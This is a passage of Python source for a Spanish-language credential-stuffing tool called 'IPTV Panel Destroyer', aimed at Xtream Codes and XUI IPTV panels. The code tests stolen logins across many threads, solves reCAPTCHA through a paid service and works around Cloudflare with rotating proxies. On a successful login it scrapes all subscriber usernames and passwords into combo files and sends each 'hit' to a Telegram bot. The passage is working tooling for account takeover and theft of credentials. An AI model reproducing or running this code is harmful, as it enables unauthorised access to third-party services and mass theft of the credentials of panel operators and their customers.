                    recaptcha_urls.put(url)
                    return

                response_text = response.text.lower()
                panel_indicators = ['login', 'username', 'password', 'admin', 'dashboard']

                if any(indicator in response_text for indicator in panel_indicators):
                    valid_urls.put(url)
                else:
                    invalid_urls.put((url, "No es un panel válido"))

            except requests.exceptions.RequestException as e:
                error_urls.put((url, f"Error de conexión: {str(e)}"))
            except Exception as e:
                error_urls.put((url, f"Error: {str(e)}"))
            finally:
                with processed.get_lock():
                    processed.value += 1

        print(f"\n{Fore.CYAN}Validando URLs...{Style.RESET_ALL}")

        with ThreadPoolExecutor(max_workers=max_threads) as executor:

            futures = [executor.submit(validate_url, url) for url in urls]

            while processed.value < total_urls:
                self.pbar(processed.value, total_urls)
                time.sleep(0.1)

        print()

        valid = list(valid_urls.queue)
        recaptcha = list(recaptcha_urls.queue)
        invalid = list(invalid_urls.queue)
        errors = list(error_urls.queue)

        return valid, recaptcha, invalid, errors

    def send_telegram_message(self, message):

        if not self.telegram_enabled:
            logging.debug("Telegram no está habilitado, mensaje no enviado")
            return False

        if not self.telegram_token or not self.telegram_chat_id:
            logging.error("Faltan credenciales de Telegram (token o chat_id)")
            return False

        formatted_message = f"""
    🔰 𝗣𝗔𝗡𝗘𝗟 𝗗𝗘𝗦𝗧𝗥𝗢𝗬𝗘𝗥 🔰

    {message}

    >> 𝐈𝐏𝐭𝐯 𝐏𝐚𝐧𝐞𝐥 𝐃𝐞𝐬𝐭𝐫𝐨𝐲𝐞𝐫 🅱🆈 🅹🅲 <<
    ___ hit by {self.hit_by}___
    """

        url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"

        data = {
            "chat_id": self.telegram_chat_id,
            "text": formatted_message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }

        max_retries = 3
        retry_delay = 2

        for attempt in range(max_retries):
            try:

                session = requests.Session()
                session.verify = False 
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Panel Scanner/1.0'
                }

                response = session.post(
                    url,
                    json=data,
                    headers=headers,
                    timeout=10
                )

                if response.status_code == 200:
                    response_data = response.json()
                    if response_data.get('ok'):
                        logging.info(f"Mensaje enviado exitosamente a Telegram (intento {attempt + 1})")
                        print(f"{Fore.GREEN}Mensaje enviado a Telegram exitosamente{Style.RESET_ALL}")
                        return True
                    else:
                        error_desc = response_data.get('description', 'Unknown error')
                        logging.error(f"Error de Telegram: {error_desc} (intento {attempt + 1})")
                else:
                    logging.error(f"Error HTTP {response.status_code} (intento {attempt + 1})")

            except requests.exceptions.Timeout:
                logging.error(f"Timeout al enviar mensaje (intento {attempt + 1})")
            except requests.exceptions.RequestException as e:
                logging.error(f"Error de conexión: {str(e)} (intento {attempt + 1})")
            except Exception as e:
                logging.error(f"Error inesperado: {str(e)} (intento {attempt + 1})")

            if attempt < max_retries - 1:
                wait_time = retry_delay * (attempt + 1)
                logging.info(f"Esperando {wait_time} segundos antes de reintentar...")
                time.sleep(wait_time)

        print(f"{Fore.RED}No se pudo enviar el mensaje a Telegram después de {max_retries} intentos{Style.RESET_ALL}")
        return False

    def test_telegram_config(self, token, chat_id):

        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            test_message = "🔹 Test de configuración exitoso\n🔹 Panel Scanner está correctamente configurado"

            data = {
                "chat_id": chat_id,
                "text": test_message,
                "parse_mode": "HTML"
            }

            response = requests.post(url, data=data, timeout=10)
            result = response.json()

            return result.get('ok', False)

        except Exception as e:
            logging.error(f"Error probando configuración de Telegram: {str(e)}")
            return False

    def load_telegram_config(self):
        config = configparser.ConfigParser()
        config_file = 'config.ini'

        try:
            if os.path.exists(config_file):
                config.read(config_file)
                if 'Telegram' in config:
                    token = config['Telegram'].get('token')
                    chat_id = config['Telegram'].get('chat_id')

                    if token and chat_id:
                        print(f"{Fore.GREEN}Configuración de Telegram cargada desde {config_file}{Style.RESET_ALL}")
                        return token, chat_id

            print(f"\n{Fore.CYAN}Configuración inicial de Telegram{Style.RESET_ALL}")
            print("Esta configuración se guardará para futuros usos.")

            token = self.get_valid_input(
                f"{Fore.GREEN}Ingrese el token del bot de Telegram: {Style.RESET_ALL}",
                input_type="text"
            )
            chat_id = self.get_valid_input(
                f"{Fore.GREEN}Ingrese el chat ID: {Style.RESET_ALL}",
                input_type="text"
            )

            if not token or not chat_id:
                print(f"{Fore.RED}Token y Chat ID no pueden estar vacíos{Style.RESET_ALL}")
                return None, None

            if 'Telegram' not in config:
                config['Telegram'] = {}

            config['Telegram']['token'] = token
            config['Telegram']['chat_id'] = chat_id

            with open(config_file, 'w') as f:
                config.write(f)

            print(f"{Fore.GREEN}Configuración guardada en {config_file}{Style.RESET_ALL}")
            return token, chat_id

        except Exception as e:
            logging.error(f"Error manejando configuración de Telegram: {str(e)}")
            return None, None

    def get_account_details(self, m3u_url):

        try:

            api_url = m3u_url.replace('get.php', 'player_api.php').replace('gets.php', 'player_api.php')
            if '&type' in api_url:
                api_url = api_url.split("&type")[0]

            logging.info(f"Consultando API: {api_url}")

            headers = {'User-Agent': self.ua.random}

            response = self.make_request_with_retry('GET', api_url, headers=headers, max_retries=2, timeout=(8, 15), verify=False)

            if response and response.status_code == 200:
                data = response.json()

                user_info = data.get('user_info', {})
                server_info = data.get('server_info', {})

                exp_date = user_info.get('exp_date')
                if exp_date in ["null", None]:
                    expiry = "Unlimited"
                else:
                    try:
                        expiry = datetime.fromtimestamp(int(exp_date)).strftime('%Y-%m-%d')
                    except:
                        expiry = "N/A"

                return {
                    'username': user_info.get('username'),
                    'password': user_info.get('password'),
                    'status': user_info.get('status', 'N/A'),

                    'expires': expiry,
                    'active_cons': user_info.get('active_cons', 'N/A'),
                    'max_cons': user_info.get('max_connections', 'N/A'),
                    'url_server': server_info.get('url', 'N/A'),
                    'port_server': server_info.get('port', 'N/A')
                }

        except Exception as e:
            logging.error(f"Error obteniendo detalles de cuenta: {str(e)}")
            return None

    def save_extracted_accounts(self, accounts, server_url, userj, passj):

        try:
            if not accounts:
                logging.warning("No hay cuentas para guardar")
                return

            hostname = urlparse(server_url).netloc.replace(':', '_')
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

            accounts_dir = 'hits_paneles/cuentas_extraidas'
            if not os.path.exists(accounts_dir):
                os.makedirs(accounts_dir)

            detailed_file = os.path.join(accounts_dir, f'cuentas_{hostname}.txt')
            with open(detailed_file, 'a', encoding='utf-8') as f:
                f.write(f"Cuentas extraídas de {server_url}\n")
                f.write(f"Login: {userj}:{passj}\n")
                f.write(f"Fecha de extracción: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 50 + "\n\n")

                for account in accounts:
                    f.write(f"Username: {account['username']}\n")
                    f.write(f"Password: {account['password']}\n")
                    f.write(f"Expires: {account['expires']}\n")
                    if 'status' in account:
                        f.write(f"Status: {account['status']}\n")
                    if 'active_cons' in account:
                        f.write(f"Active Connections: {account['active_cons']}\n")
                    if 'max_cons' in account:
                        f.write(f"Max Connections: {account['max_cons']}\n")
                    f.write("-" * 30 + "\n")

            combo_file = os.path.join(accounts_dir, 'super_combo.txt')
            with open(combo_file, 'a', encoding='utf-8') as f:
                for account in accounts:
                    f.write(f"{account['username']}:{account['password']}\n")

            logging.info(f"Cuentas guardadas en {detailed_file}")
            logging.info(f"Combo actualizado en {combo_file}")

            return detailed_file, combo_file

        except Exception as e:
            logging.error(f"Error guardando cuentas extraídas: {str(e)}")
            return None, None

    def clean_expires_date(self, expires_str):

        try:

            clean_str = re.sub(r'<[^>]+>', '', str(expires_str))

            if clean_str.isdigit():
                if len(clean_str) > 8:
                    return datetime.fromtimestamp(int(clean_str)).strftime('%Y-%m-%d')
                return f"{clean_str} días"
            return clean_str.strip() or 'N/A'
        except:
            return 'N/A'

    def list_files_in_directory(self, directory, file_type=""):

        try:
            files = [f for f in os.listdir(directory) if f.endswith('.txt')]
            if not files:
                print(f"{Fore.RED}No se encontraron archivos{' ' + file_type if file_type else ''} en {directory}{Fore.RESET}")
                return [], {}

            print(f"\n{Fore.CYAN}Archivos {file_type} disponibles:{Fore.RESET}")
            files_dict = {}
            for idx, file in enumerate(files, 1):
                files_dict[idx] = file
                print(f"{Fore.YELLOW}[{idx}] {file}{Fore.RESET}")

            return files, files_dict

        except Exception as e:
            logging.error(f"Error listando archivos en {directory}: {e}")
            return [], {}

    def select_file(self, directory, file_type=""):

        files, files_dict = self.list_files_in_directory(directory, file_type)
        if not files:
            return ""

        while True:
            try:
                choice_str = self.get_valid_input(
                    f"\n{Fore.GREEN}Seleccione el número del archivo {file_type} (0 para cancelar): {Fore.RESET}",
                    input_type="text"
                )
                if not choice_str or choice_str == "0":
                    return ""

                choice = int(choice_str)
                if choice == 0:
                    return ""

                choice = int(choice)
                if choice in files_dict:
                    return os.path.join(directory, files_dict[choice])

                print(f"{Fore.RED}Número inválido. Intente nuevamente.{Fore.RESET}")
            except ValueError:
                print(f"{Fore.RED}Por favor ingrese un número válido.{Fore.RESET}")

    def process_accounts_data(self, table_response, panel_type, m3u_host):

        accounts = []
        try:
            if 'data' not in table_response:
                logging.error("No se encontraron datos en la respuesta")
                return accounts

            for item in table_response['data']:
                try:
                    if len(item) < 8:
                        continue

                    raw_username = item[1]
                    if panel_type == "XUI":
                        username = self.extract_username_from_html(raw_username)
                    else:
                        username = raw_username.split('">')[1] if '">' in raw_username else raw_username

                    password = item[2]

                    expires = item[7]

                    expires = re.sub(r'<[^>]+>', '', str(expires))

                    status = "ON" if any(s in str(item).lower() for s in ['active', 'enabled', '1']) else "Inactive"

                    account = {
                        'username': username.strip(),
                        'password': password.strip(),
                        'expires': expires.strip(),
                        'status': status
                    }

                    accounts.append(account)
                    logging.info(f"Cuenta procesada: {username}")

                except Exception as e:
                    logging.error(f"Error procesando cuenta individual: {str(e)}")
                    continue

            logging.info(f"Total de cuentas procesadas: {len(accounts)}")
            return accounts

        except Exception as e:
            logging.error(f"Error en process_accounts_data: {str(e)}")
            return accounts

    def extract_username_from_html(self, html_str):

        try:
            match = re.search(r"id=\d+'>([^<]+)</a>", html_str)
            if match:
                return match.group(1)
            return re.sub(r'<[^>]+>', '', html_str).strip()
        except:
            return html_str.strip()

    def get_table_params(self, panel_type):

        params = {
            'draw': '4700' if panel_type == 'XC' else '2',
            'length': '250',
            'start': '0',
            'search[value]': '',
            'id': 'users' if panel_type == 'XC' else 'lines',
            'filter': '1'
        }

        for i in range(12):
            params.update({
                f'columns[{i}][data]': str(i),
                f'columns[{i}][name]': '',
                f'columns[{i}][searchable]': 'true',
                f'columns[{i}][orderable]': 'true' if i < 11 else 'false'
            })

        params['order[0][column]'] = '0'
        params['order[0][dir]'] = 'desc'

        return params

    def get_thread_count(self):

        while True:
            try:
                threads = self.get_valid_input(
                    f"\n{Fore.GREEN}Ingrese el número de bots a utilizar (1-300): {Fore.RESET}",
                    input_type="int",
                    min_val=1,
                    max_val=300
                )
                if threads is not None:
                    return threads
                return 1  
            except ValueError:
                print(f"{Fore.RED}Por favor ingrese un número válido{Fore.RESET}")

    def extract_host_from_html(self, html_text):
        """Intenta extraer el host m3u de varias formas diferentes del HTML"""
        try:

            patterns = [
                r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+/get\.php',
                r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+/live',
                r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+/player_api\.php',
                r'var\s+domain\s*=\s*[\'"]([^\'"]+)[\'"]',
                r'server_host\s*=\s*[\'"]([^\'"]+)[\'"]',
                r'host\s*:\s*[\'"]([^\'"]+)[\'"]'
            ]

            for pattern in patterns:
                match = re.search(pattern, html_text)
                if match:

                    if '(' in pattern:
                        url = match.group(1)
                    else:
                        url = match.group(0)

                    if '/get.php' in url:
                        url = url.split('/get.php')[0]
                    elif '/player_api.php' in url:
                        url = url.split('/player_api.php')[0]
                    elif '/live' in url:
                        url = url.split('/live')[0]

                    return url

            all_urls = re.findall(r'https?://[^\s\'"<>]+', html_text)
            if all_urls:

                potential_hosts = [
                    url for url in all_urls 
                    if any(term in url.lower() for term in ['iptv', 'stream', 'tv', 'player', 'live'])
                ]

                if potential_hosts:

                    parsed = urlparse(potential_hosts[0])
                    return f"{parsed.scheme}://{parsed.netloc}"

            return None
        except Exception as e:
            logging.error(f"Error extrayendo host m3u: {str(e)}")
            return None

    def verify_custom_as_hit(self, username, password, original_url):
        """Verifica si un custom es realmente un hit en la URL original"""
        try:
            logging.info(f"🔍 Verificando custom {username} en URL original: {original_url}")

            initial_response = self.make_request('get', original_url, timeout=10)

            if not initial_response:
                logging.error(f"❌ No se pudo acceder a URL original para {username}")
                return False

            captcha_sitekey = self.detect_recaptcha(initial_response.text)
            captcha_response = None

            if captcha_sitekey and isinstance(captcha_sitekey, str):
                logging.info(f"🤖 Resolviendo reCAPTCHA para custom {username}")
                print(f"{Fore.CYAN}🤖 Resolviendo reCAPTCHA para verificar custom {username}...{Style.RESET_ALL}")

                captcha_response = self.solve_recaptcha(captcha_sitekey, original_url)

                if not captcha_response:
                    logging.error(f"❌ No se pudo resolver reCAPTCHA para {username}")
                    print(f"{Fore.RED}❌ Error resolviendo reCAPTCHA para {username}{Style.RESET_ALL}")
                    return False

            login_data = {
                'referrer': '',
                'username': username,
                'password': password,
                'login': ''
            }

            if captcha_response:
                login_data['g-recaptcha-response'] = captcha_response

            cookies = initial_response.cookies
            login_response = self.make_request(
                'post',
                original_url,
                data=login_data,
                cookies=cookies,
                timeout=10
            )

            if not login_response:
                logging.error(f"❌ Fallo en login original para {username}")
                return False

            verify_result = self.verify_login_success(login_response, username)

            if verify_result and verify_result != "custom":
                logging.info(f"✅ Custom {username} es HIT REAL en URL original")
                print(f"{Fore.GREEN}🎯 Custom {username} confirmado como HIT REAL!{Style.RESET_ALL}")

                success = self.process_successful_login(
                    login_response,
                    username,
                    password,
                    cookies.get('PHPSESSID'),
                    original_url
                )

                if success:
                    if hasattr(self, 'successful_results') and not self.successful_results.empty():
                        try:
                            last_hit = list(self.successful_results.queue)[-1]
                            last_hit['message'] += f"\n🔄 Convertido de custom a hit"
                            last_hit['message'] += f"\n💰 2captcha usado: {'Sí' if captcha_response else 'No'}"
                        except:
                            pass

                    return True
            else:
                logging.info(f"❌ Custom {username} sigue siendo custom en URL original")
                return False

            return False

        except Exception as e:
            logging.error(f"❌ Error verificando custom {username} en URL original: {str(e)}")
            return False

    def process_hit_from_rescue(self, username, password, rescue_response, rescue_session_id):
        """Procesa hit encontrado en rescue usando URL original para datos completos"""
        try:
            logging.info(f"🎯 Procesando hit de rescue {username} con URL original: {self.original_url}")

            initial_response = self.make_request('get', self.original_url, timeout=10)

            if not initial_response:
                logging.error(f"❌ No se pudo acceder a URL original para hit {username}")
                return self.process_successful_login(
                    rescue_response,
                    username,
                    password,
                    rescue_session_id,
                    self.server_url
                )

            captcha_sitekey = self.detect_recaptcha(initial_response.text)
            captcha_response = None

            if captcha_sitekey and isinstance(captcha_sitekey, str):
                logging.info(f"🤖 Resolviendo reCAPTCHA para hit {username}")
                print(f"{Fore.CYAN}🤖 Resolviendo reCAPTCHA para hit {username}...{Style.RESET_ALL}")

                captcha_response = self.solve_recaptcha(captcha_sitekey, self.original_url)

                if not captcha_response:
                    logging.warning(f"❌ No se pudo resolver reCAPTCHA - usando datos de rescue")
                    return self.process_successful_login(
                        rescue_response,
                        username,
                        password,
                        rescue_session_id,
                        self.server_url
                    )

            login_data = {
                'referrer': '',
                'username': username,
                'password': password,
                'login': ''
            }

            if captcha_response:
                login_data['g-recaptcha-response'] = captcha_response

            cookies = initial_response.cookies
            login_response = self.make_request(
                'post',
                self.original_url,
                data=login_data,
                cookies=cookies,
                timeout=10
            )

            if not login_response:
                logging.warning(f"❌ Fallo en login original - usando datos de rescue")
                return self.process_successful_login(
                    rescue_response,
                    username,
                    password,
                    rescue_session_id,
                    self.server_url
                )

            verify_result = self.verify_login_success(login_response, username)

            if verify_result and verify_result != "custom":
                logging.info(f"✅ Hit confirmado en URL original para {username}")

                success = self.process_successful_login(
                    login_response,
                    username,
                    password,
                    cookies.get('PHPSESSID'),
                    self.original_url
                )

                if success:
                    if hasattr(self, 'successful_results') and not self.successful_results.empty():
                        try:
                            last_hit = list(self.successful_results.queue)[-1]
                            last_hit['message'] += f"\n🔄 Hit encontrado en rescue, procesado con URL original"
                            last_hit['message'] += f"\n💰 2captcha usado: {'Sí' if captcha_response else 'No'}"
                        except:
                            pass

                    return True
            else:
                logging.warning(f"❌ Hit de rescue no confirmado en URL original - usando datos de rescue")
                return self.process_successful_login(
                    rescue_response,
                    username,
                    password,
                    rescue_session_id,
                    self.server_url
                )

            return False

        except Exception as e:
            logging.error(f"❌ Error procesando hit de rescue {username}: {str(e)}")
            return self.process_successful_login(
                rescue_response,
                username,
                password,
                rescue_session_id,
                self.server_url
            )

    def extract_accounts_from_hit(self, username, password, server_url):
        """Extracción optimizada y rápida"""
        try:
            print(f"{Fore.CYAN}🔄 Extrayendo cuentas con credenciales {username}...{Style.RESET_ALL}")

            extractor = AccountExtractor(
                url=server_url,
                username=username,
                password=password,
                proxy_manager=self.proxy_manager,
                verbose=False,
                proxy_url=self.flaresolverr_proxy_url
            )

            if extractor.login():
                print(f"{Fore.GREEN}✅ Login exitoso en extractor para {username}{Style.RESET_ALL}")

                accounts = extractor.extract_accounts()

                if accounts:
                    print(f"{Fore.GREEN}🎉 Extraídas {len(accounts)} cuentas con {username}!{Style.RESET_ALL}")

                    accounts_file = extractor.save_accounts(accounts, username, password)

                    if accounts_file:
                        print(f"{Fore.GREEN}📁 Cuentas guardadas en: {os.path.basename(accounts_file)}{Style.RESET_ALL}")
                        return accounts, accounts_file
                    else:
                        return accounts, None
                else:
                    print(f"{Fore.YELLOW}⚠️ No se encontraron cuentas para extraer con {username}{Style.RESET_ALL}")
                    return None, None
            else:
                print(f"{Fore.RED}❌ Error en login del extractor para {username}{Style.RESET_ALL}")
                return None, None

        except Exception as e:
            print(f"{Fore.RED}❌ Error extrayendo cuentas con {username}: {str(e)}{Style.RESET_ALL}")
            logging.error(f"Error extrayendo cuentas: {str(e)}")
            return None, None

    def create_banner(self):
        banner = f"""{Fore.CYAN}{Style.BRIGHT}
      ____            _
    |  __ \\          | |
    | |  | | ___  ___| |_ _ __ ___  _   _  ___ _ __
    | |  | |/ _ \\/ __| __| '__/ _ \\| | | |/ _ \\ '__|
    | |__| |  __/\\__ \\ |_| | | (_) | |_| |  __/ |
    |_____/ \\___||___/\\__|_|  \\___/ \\__, |\\___|_|
                                    __/  |
    P A N E L  XC & XUI             |___/
    {Back.WHITE}{Fore.RED}                 Developed by JC   Ver. {self.version}             {Style.RESET_ALL}
  """
        return banner

    def create_progress_bar(self, width=50):
        try:
            progress = min(1.0, self.stats['checked'] / self.stats['total'])
            max_width = min(width, self.terminal_width - 20)
            filled_length = int(max_width * progress)
            filled_length = min(filled_length, max_width)

            bar = (
                f"{Fore.GREEN}{'■' * filled_length}"
                f"{Fore.WHITE}{'□' * (max_width - filled_length)}"
                f"{Style.RESET_ALL}"
            )
            percentage = min(100, progress * 100)
            return f"[{bar}] {Fore.YELLOW}{percentage:.1f}%{Style.RESET_ALL}"
        except:
            return f"[{Fore.RED}Error generando barra{Style.RESET_ALL}]"

    def format_proxy_for_display(self, proxy_obj):
        """Formatea proxy para mostrar de forma segura"""
        try:
            if not proxy_obj or 'http' not in proxy_obj:
                return "N/A"

            proxy_url = proxy_obj['http']

            if '@' in proxy_url:
                protocol = proxy_url.split('://')[0]
                auth_part = proxy_url.split('://')[1].split('@')[0]
                host_part = proxy_url.split('@')[1]

                username = auth_part.split(':')[0]
                return f"{protocol}://{username}:***@{host_part}"
            else:
                return proxy_url

        except Exception as e:
            return "Error format"

    def format_time(self, seconds):
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        seconds = seconds % 60
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    def make_request(self, method, url, **kwargs):
        """Request mejorado con soporte para Cloudflare"""
        try:
            timeout = kwargs.pop('timeout', 15)
            proxy = kwargs.pop('proxy', None)
            retry_count = kwargs.pop('retry_count', 0)
            max_retries = 2

            if not hasattr(self, 'cf_detector'):
                self.cf_detector = CloudflareDetector()

            session = requests.Session()
            session.verify = False

            if proxy:
                try:
                    session.proxies.update(proxy)
                except Exception as e:
                    logging.error(f"Error configurando proxy {proxy}: {str(e)}")
                    if proxy in self.proxy_manager.proxiesList:
                        self.proxy_manager.eliminateProxy(proxy)
                    return None

            try:
                headers, strategy = self.cf_detector.detect_and_get_headers(url)
                if strategy.startswith('cloudflare'):
                    logging.info(f"🛡️ Usando estrategia Cloudflare: {strategy}")

                if 'headers' in kwargs:
                    custom_headers = kwargs.pop('headers')
                    headers.update(custom_headers)

                kwargs['headers'] = headers

            except Exception as e:
                logging.warning(f"Error con detector Cloudflare: {str(e)}")

                if 'headers' not in kwargs:
                    kwargs['headers'] = self.get_headers()

            retry_strategy = Retry(
                total=1,
                backoff_factor=0.3,
                status_forcelist=[407, 429, 500, 502, 503, 504]
            )
            adapter = HTTPAdapter(max_retries=retry_strategy)
            session.mount('http://', adapter)
            session.mount('https://', adapter)

            try:
                if method.lower() == 'get':
                    response = session.get(url, timeout=timeout, **kwargs)
                else:
                    response = session.post(url, timeout=timeout, **kwargs)

                if self.cf_detector._detect_cloudflare_in_response(response):
                    logging.warning(f"🛡️ Cloudflare challenge detectado en respuesta")

                    if retry_count < max_retries:
                        kwargs['retry_count'] = retry_count + 1
                        aggressive_headers, _ = self.cf_detector.detect_and_get_headers(url, max_attempts=4)
                        kwargs['headers'] = aggressive_headers

                        logging.info(f"🛡️ Reintentando con headers agresivos...")
                        return self.make_request(method, url, **kwargs)

                return response

            except (ProxyError, Urllib3ProxyError) as e:
                logging.error(f"Error de proxy: {str(e)}")
                if proxy:
                    self.proxy_manager.eliminateProxy(proxy)
                return None

            except (ConnectTimeout, ReadTimeout) as e:
                logging.error(f"Timeout conectando a {url}: {str(e)}")
                if retry_count < max_retries:
                    kwargs['retry_count'] = retry_count + 1
                    if proxy:
                        self.proxy_manager.recycle_proxy(proxy)
                    return self.make_request(method, url, **kwargs)
                if proxy:
                    self.proxy_manager.eliminateProxy(proxy)
                return None

            except ConnectionError as e:
                logging.error(f"Error de conexión a {url}: {str(e)}")
                if proxy:
                    self.proxy_manager.eliminateProxy(proxy)
                return None

        except Exception as e:
            logging.error(f"Error en request a {url}: {str(e)}")
            print(f"{Fore.YELLOW}⚠️ Error: {str(e)}{Style.RESET_ALL}")
            if proxy:
                self.proxy_manager.recycle_proxy(proxy)
            return None

        finally:
            session.close()

    def make_request_fallback(self, method, url, **kwargs):
        """Fallback usando urllib para servidores muy problemáticos"""
        try:
            import urllib.request
            import urllib.parse
            import urllib.error
            import ssl

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            headers = kwargs.get('headers', {})

            if method.lower() == 'get':
                req = urllib.request.Request(url, headers=headers)
            else:

                data = kwargs.get('data', {})
                if isinstance(data, dict):
                    data = urllib.parse.urlencode(data).encode()
                req = urllib.request.Request(url, data=data, headers=headers)

            with urllib.request.urlopen(req, timeout=kwargs.get('timeout', 10), context=ctx) as response:
                content = response.read().decode('utf-8', errors='ignore')

                class FallbackResponse:
                    def __init__(self, status_code, text, url):
                        self.status_code = status_code
                        self.text = text
                        self.url = url
                        self.headers = {}
                        self.cookies = {}

                return FallbackResponse(response.getcode(), content, url)

        except Exception as e:
            logging.error(f"Error en fallback request: {str(e)}")
            return None

    def make_request_backup(self, method, url, **kwargs):
        try:
            timeout = kwargs.pop('timeout', 5)
            proxy = kwargs.pop('proxy', None)
            retry_count = kwargs.pop('retry_count', 0)
            max_retries = 2 
            session = requests.Session()
            session.verify = False

            if proxy:
                try:
                    session.proxies.update(proxy)
                except Exception as e:
                    logging.error(f"Error configurando proxy {proxy}: {str(e)}")
                    if proxy in self.proxy_manager.proxiesList:
                        self.proxy_manager.eliminateProxy(proxy)
                    return None

            retry_strategy = Retry(
                total=1, 
                backoff_factor=0.3,
                status_forcelist=[407, 429, 500, 502, 503, 504]
            )
            adapter = HTTPAdapter(max_retries=retry_strategy)
            session.mount('http://', adapter)
            session.mount('https://', adapter)

            try:
                if method.lower() == 'get':
                    response = session.get(url, timeout=timeout, **kwargs)
                else:
                    response = session.post(url, timeout=timeout, **kwargs)

                return response

            except (ProxyError, Urllib3ProxyError) as e:
                logging.error(f"Error de proxy: {str(e)}")
                if proxy:
                    self.proxy_manager.eliminateProxy(proxy)
                return None

            except (ConnectTimeout, ReadTimeout) as e:
                if retry_count < max_retries:
                    kwargs['retry_count'] = retry_count + 1
                    if proxy:
                        self.proxy_manager.recycle_proxy(proxy)
                    return self.make_request(method, url, **kwargs)
                if proxy:
                    self.proxy_manager.eliminateProxy(proxy)
                return None

            except ConnectionError as e:
                if proxy:
                    self.proxy_manager.eliminateProxy(proxy)
                return None

        except Exception as e:
            logging.error(f"Error en request a {url}: {str(e)}")
            if proxy:
                self.proxy_manager.eliminateProxy(proxy)
            return None

        finally:
            session.close()

    def save_custom_hit(self, server_url, username, password):
        try:
            custom_dir = 'hits_paneles/custom'
            if not os.path.exists(custom_dir):
                os.makedirs(custom_dir)

            hostname = urlparse(server_url).netloc.replace(':', '_')
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{custom_dir}/custom_{hostname}_{timestamp}.txt"

            custom_message = f"""🔸 CUSTOM HIT - (POSIBLE HIT) 🔸
    Server: {server_url}
    Username: {username}
    Password: {password}
    Revise esta cuenta en la url correcta

    Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

    >> IPTV Panel Destroyer By JC 
    ___ Hit By: {self.hit_by}___"""

            with open(filename, 'w', encoding='utf-8') as f:
                f.write(custom_message)

            logging.info(f"Custom hit guardado: {username}:{password} -> {server_url}")

            if self.telegram_enabled and self.telegram_token and self.telegram_chat_id:
                telegram_message = f"""🔸 CUSTOM HIT - Posible Hit 🔸
    {self.current_time}

    Server: {server_url}
    Username: {username}
    Password: {password}

    Revisa esta cuenta en la url correcta

    >> IPTV Panel Destroyer By JC 
    >>>> Hit By {self.hit_by} <<<<"""

                try:
                    url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
                    response = requests.post(
                        url,
                        json={
                            "chat_id": self.telegram_chat_id,
                            "text": telegram_message
                        },
                        verify=False,
                        timeout=10
                    )
                    if response.status_code == 200:
                        logging.info("Custom hit enviado exitosamente a Telegram")
                    else:
                        logging.error(f"Error enviando custom hit a Telegram: {response.text}")
                except Exception as e:
                    logging.error(f"Error enviando custom hit a Telegram: {str(e)}")

        except Exception as e:
            logging.error(f"Error guardando custom hit: {str(e)}")

    def save_hit_info(self, panel_info, hit_message, username):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"hits_paneles/hit_{username}_{timestamp}.txt"

            with open(filename, 'a', encoding='utf-8') as f:
                f.write("🔰 PANEL DESTROYER 🔰\n")
                f.write("=" * 50 + "\n\n")
                f.write(hit_message + "\n\n")
                f.write("=" * 50 + "\n")
                f.write(">> 𝐈𝐏𝐭𝐯 𝐏𝐚𝐧𝐞𝐥 𝐃𝐞𝐬𝐭𝐫𝐨𝐲𝐞𝐫 🅱🆈 🅹🅲 <<\n")
                f.write(f"___ hit by {self.hit_by}___\n\n")

            logging.info(f"Hit guardado en {filename}")

        except Exception as e:
            logging.error(f"Error guardando hit: {str(e)}")

    def save_hit(self, url, username, password, panel_type, is_admin, expires="N/D", active_cons="N/D", max_cons="N/D", reseller_dns="N/D", server_info="N/D", credits="N/D", open_connections="N/D", online_users="N/D", host_m3u="N/D"):
        """Guarda hit con información básica"""
        try:
            from urllib.parse import urlparse

            server_name = self.normalize_server_name(url)

            server_folder = f"hits_paneles/{server_name}"
            hits_subfolder = f"{server_folder}/hits_{server_name}"
            os.makedirs(hits_subfolder, exist_ok=True)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_username = self.sanitize_filename(username)
            safe_password = self.sanitize_filename(password)

            is_admin_bool = is_admin == "SI" if isinstance(is_admin, str) else bool(is_admin)

            if is_admin_bool:
                filename = f"{hits_subfolder}/ADMIN_{safe_username}_{safe_password}_{timestamp}.txt"
            else:
                filename = f"{hits_subfolder}/{safe_username}_{safe_password}_{timestamp}.txt"

            if host_m3u == "N/D" or not host_m3u:
                parsed_url = urlparse(url)

                if parsed_url.port in [2083, 443] or parsed_url.scheme == 'https':
                    m3u_port = 443
                else:
                    m3u_port = 8080
                host_m3u = f"http{'s' if m3u_port == 443 else ''}://{parsed_url.hostname}:{m3u_port}" if parsed_url.hostname else "N/D"

            hit_message = f"""🔰 PANEL DESTROYER 🔰

🔹 Host: {url}
🔹 Username: {username}
🔹 Password: {password}
🔹 Panel Type: {panel_type}
🔹 Is Admin: {'YES' if is_admin_bool else 'NO'}
🔹 Credits: {credits}
🔹 Open connections: {open_connections}
🔹 Online users: {online_users}
🔹 Active Accounts: {active_cons}
🔹 Host m3u: {host_m3u}

>> IPTV Panel Destroyer By JC <<
___ Hit By: {self.hit_by} ___
"""

            with open(filename, 'w', encoding='utf-8') as f:
                f.write(hit_message)

            logging.info(f"Hit guardado en: {filename}")
            print(f"{Fore.GREEN}💾 Hit guardado: {os.path.basename(filename)}{Style.RESET_ALL}")

            self.save_combo_to_file(username, password, server_name)

            if self.telegram_enabled and self.telegram_token and self.telegram_chat_id:
                try:
